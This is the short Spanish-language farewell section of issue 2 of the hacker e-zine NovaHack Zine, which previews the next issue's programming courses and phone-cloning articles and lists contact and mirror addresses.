[19]----------------------------------[ Despedida ]-------------------------------------[19]
============================================================================================

                                    [ NovaHack Zine ]



Bueno pues hasta aqui ha llegado el No. 2 de NovaHack Zine, espero que te haya gustado. En el proximo numero tendremos las terceras partes de los cursos de Pascal y Ensamblador, empezaremos un curso de C, asi como uno de JavaScript.

Continuaresmos con la clonacion de celulares motorola y ericcson, tendremos mas de microcontroladores, y mas y mas cosas del mundo hack.

Recuerda si quieres colaborar con NHZ o darnos tu comentario, o participar en el logo de NHZ mandanos tu email a nhz@novahack.com

Te recuerdo donde puedes encontrar NHZ:

http://www.novahack.com/nhz <---web oficial
http://www.novahack.com
http://www.prehackers.com
http://www.chaospc.tk
http://www.zine-store.com.ar

Salu2 y nos leemos en el proximo numero. Chao.

[[ EOF ]]